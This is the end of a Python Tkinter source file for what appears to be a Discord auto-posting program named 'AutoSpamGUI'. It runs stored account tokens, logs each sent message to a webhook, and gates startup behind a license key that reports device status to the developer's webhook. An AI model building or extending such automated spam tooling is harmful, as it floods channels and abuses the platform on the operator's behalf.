        if 'days' in time_config:
            total_seconds += time_config['days'] * 24 * 3600
        if 'hours' in time_config:
            total_seconds += time_config['hours'] * 3600
        if 'minutes' in time_config:
            total_seconds += time_config['minutes'] * 60
        if 'seconds' in time_config:
            total_seconds += time_config['seconds']

        # Ensure minimum delay of 1 second
        return max(total_seconds, 1)

    def send_webhook(self, channel_id, message, success, time_config, ping_user=None, is_dm=False, token_name=None):
        webhook_url = self.config.get('webhook_url')
    
        if not webhook_url:
            logging.warning("Webhook URL is not set. Skipping webhook send.")
            return
    
        logging.info(f"Preparing to send webhook for {'DM' if is_dm else 'channel'} {channel_id}")
    
        current_time = time.strftime("%I:%M:%S %p")
    
        # Safely handle None token_name
        if token_name is None:
            # Try to find a token associated with this channel
            for channel in self.config.get("channels", []):
                if channel.get("channel_id") == channel_id:
                    token_name = channel.get("token_name")
                    break
                
        # Fallback account name handling
        account_name = "Unknown Account"
        if token_name:
            # Safely find the account name
            for name, token in self.config.get("tokens", {}).items():
                if name == token_name:
                    account_name = name
                    break
    
        # Use token-specific status key to get correct message count
        status_key = f"{channel_id}_{token_name}"
        message_count = 0
        running_time_str = "00:00:00"
        
        with self.channel_status_lock:
            status = self.channel_status.get(status_key, {})
            message_count = status.get('message_count', 0)
            start_time = status.get('start_time')
            if start_time and status.get('status') == 'Running':
                running_time = datetime.now() - datetime.fromtimestamp(start_time)
                hours, remainder = divmod(int(running_time.total_seconds()), 3600)
                minutes, seconds = divmod(remainder, 60)
                running_time_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
    
        banner_url = "https://i.ibb.co.com/f1ZScNq/standard-2.gif"
    
        # Get the account name from token name
        account_name = next((name for name, token in self.config["tokens"].items() 
                            if name.startswith(token_name)), token_name)
    
        embed = {
            "title": " Auto Message Log ",
            "color": 0x9B59B6,
            "fields": [
                {"name": "<a:seru:1204280141145186334> Status", "value": "<a:kk_gif_Online_Ping:1204283707251236904> Message sent successfully" if success else "<a:offline:1204283658895368264> Failed to send message", "inline": False},
                {"name": "<:messenger:1268148703252971584> Channel", "value": f"<#{channel_id}>" if not is_dm else f"DM to <#{channel_id}>", "inline": True},
                {"name": "<:user:1268148703252971584> Account", "value": account_name, "inline": True},  # Added account name field
                {"name": "<a:crap5:1268148019740540928> Time", "value": current_time, "inline": True},
                {"name": "<a:XYRASirine:1204282584503296040> Running Time", "value": running_time_str, "inline": True},
                {"name": "<a:pin:1204280241653284904> Messages Sent", "value": str(message_count), "inline": True},
                {"name": "<:clock:1268147985901158506> Interval", "value": self.format_time_config(time_config), "inline": True},
                {"name": "<:birth:1268147985901158506> Message", "value": f"```{message[:1000]}```", "inline": False},
            ],
            "image": {"url": banner_url},
            "footer": {
                "text": "Auto Post | Creator: Tann18"
            }
        }
    
        payload = {
            "embeds": [embed],
            "username": "Auto Message Log",
            "avatar_url": "https://i.ibb.co.com/FwddMLs/image.png"
        }
    
        if not success and ping_user:
            payload["content"] = f"<@{ping_user}> Message failed to send!"
    
        try:
            response = requests.post(webhook_url, json=payload, timeout=10, verify=self.cert_path)
            response.raise_for_status()
            logging.info(f"Webhook sent successfully. Status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            logging.error(f"Failed to send webhook: {str(e)}")
            if hasattr(e, 'response'):
                logging.error(f"Response status code: {e.response.status_code}")
                logging.error(f"Response content: {e.response.text}")
            else:
                logging.error("No response object available")

    def get_message_count(self, channel_id):
        """Retrieve total message count for a specific channel"""
        with self.channel_status_lock:
            channel_status = self.channel_status.get(channel_id, {})
            return channel_status.get('message_count', 0)

class AnimatedGIF:
    def __init__(self, master, gif_url="https://i.ibb.co.com/f1ZScNq/standard-2.gif"):
        self.master = master
        self.gif_url = gif_url
        self.frames = []
        self.current_frame = 0
        self.is_animated = False

        self.image_label = ttk.Label(master)
        self.image_label.pack(pady=5)

        # Try to load the GIF
        if not self.load_gif():
            # If GIF loading fails, create a static image with text
            self.create_static_image()
        else:
            self.animate(0)

    def load_gif(self):
        try:
            response = requests.get(self.gif_url, timeout=3)
            if response.status_code == 200:
                gif = Image.open(BytesIO(response.content))
                
                if hasattr(gif, 'n_frames') and gif.n_frames > 1:
                    for frame in range(0, gif.n_frames):
                        gif.seek(frame)
                        frame_image = gif.copy().resize((480, 200))
                        photo = ImageTk.PhotoImage(frame_image)
                        self.frames.append(photo)
                    self.is_animated = True
                    return True
            return False
        except Exception as e:
            logging.error(f"Error loading GIF: {str(e)}")
            return False

    def create_static_image(self):
        # Create a blank image with text
        img = Image.new('RGB', (480, 200), color=(240, 240, 240))
        from PIL import ImageDraw, ImageFont
        draw = ImageDraw.Draw(img)
        
        # Try to use a system font
        try:
            font = ImageFont.truetype("arial.ttf", 18)
        except:
            font = ImageFont.load_default()
            
        draw.text((240, 100), "Loading...", fill=(0, 0, 0), font=font, anchor="mm")
        
        photo = ImageTk.PhotoImage(img)
        self.frames.append(photo)
        self.image_label.config(image=self.frames[0])
        self.image_label.image = self.frames[0]  # Keep a reference to prevent garbage collection

    def animate(self, counter):
        if not self.is_animated or len(self.frames) == 0:
            return
        
        self.image_label.config(image=self.frames[self.current_frame])
        self.image_label.image = self.frames[self.current_frame]  # Keep a reference
        self.current_frame = (self.current_frame + 1) % len(self.frames)
        self.master.after(100, self.animate, counter + 1)

# Update the loading window function to use the GIF
def show_loading_window(parent):
    loading_window = tk.Toplevel(parent)
    loading_window.title("Loading")
    loading_window.geometry("500x300")
    loading_window.resizable(False, False)
    loading_window.attributes('-topmost', True)
    loading_window.overrideredirect(True)
    
    # Set background color immediately
    loading_window.configure(bg="#2b2b2b")
    
    # Center the window
    screen_width = parent.winfo_screenwidth()
    screen_height = parent.winfo_screenheight()
    x_coordinate = int((screen_width/2) - (250))
    y_coordinate = int((screen_height/2) - (150))
    
    loading_window.geometry(f"500x300+{x_coordinate}+{y_coordinate}")
    
    # Create and configure frame with background color immediately
    frame = ttk.Frame(loading_window, borderwidth=2, relief='raised')
    style = ttk.Style()
    style.configure("TFrame", background="#2b2b2b")
    frame.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
    
    # Create a simple loading label with proper styling
    label_style = ttk.Style()
    label_style.configure("Loading.TLabel", background="#2b2b2b", foreground="white", font=("Helvetica", 14))
    label = ttk.Label(frame, text="Memproses, mohon tunggu...", style="Loading.TLabel")
    label.pack(pady=(20, 0))
    
    # Use the animated GIF
    animated_gif = AnimatedGIF(frame, "https://i.ibb.co.com/f1ZScNq/standard-2.gif")
    
    # Force update to show immediately
    loading_window.update_idletasks()
    loading_window.update()
    
    return loading_window

def create_themed_tk():
    try:
        return ThemedTk(theme="arc")
    except Exception as e:
        logging.warning(f"Failed to load 'arc' theme: {str(e)}. Using default theme.")
        return tk.Tk()

def start_main_application(root):
    # Bersihkan semua widget yang mungkin ada di root window
    for widget in root.winfo_children():
        widget.destroy()
    
    # Inisialisasi AutoSpamGUI
    app = AutoSpamGUI(root)
    
    # Tampilkan jendela utama
    root.deiconify()

def check_and_activate_key(root):
    is_valid, message = check_key()
    if is_valid:
        messagebox.showinfo("Info", "Perangkat ini sudah memiliki key aktif.\nAplikasi berjalan...")
        return True
    else:
        while True:
            key = simpledialog.askstring("Aktivasi", "Masukkan key untuk aktivasi:")
            if key:
                is_activated, activation_message, activated_key = activate_key(key)
                if is_activated:
                    messagebox.showinfo("Info", activation_message + "\nAplikasi berjalan...")
                    return True
                else:
                    retry = messagebox.askretrycancel("Error", activation_message + "\nCoba lagi?")
                    if not retry:
                        send_uuid_status_webhook(UNREGISTERED_WEBHOOK_URL, "Invalid key entered", is_registered=False)
                        return False
            else:
                send_uuid_status_webhook(UNREGISTERED_WEBHOOK_URL, "No key entered", is_registered=False)
                return False

def main():
    try:
        root = create_themed_tk()
        root.withdraw()  # Hide the main window initially
        
        # Show loading window immediately
        loading_window = show_loading_window(root)
        
        def after_loading():
            try:
                is_valid, message = check_key()
                if loading_window:
                    loading_window.destroy()  # Close loading window
                
                if is_valid:
                    start_main_application(root)
                else:
                    # Key check failed, try activation
                    if not check_and_activate_key(root):
                        root.destroy()
                        return
                    start_main_application(root)
            except Exception as e:
                logging.error(f"Error in after_loading: {str(e)}")
                messagebox.showerror("Error", f"An error occurred: {str(e)}")
                if loading_window:
                    loading_window.destroy()
                root.destroy()

        # Schedule the after_loading function to run after a shorter delay
        root.after(1000, after_loading)
        
        # Start the main event loop
        root.mainloop()
        
    except Exception as e:
        logging.error(f"Application error: {str(e)}")
        messagebox.showerror("Error", "An error occurred. Please check your key and try again.")
        if 'root' in locals():
            root.destroy()


if __name__ == "__main__":
    main()
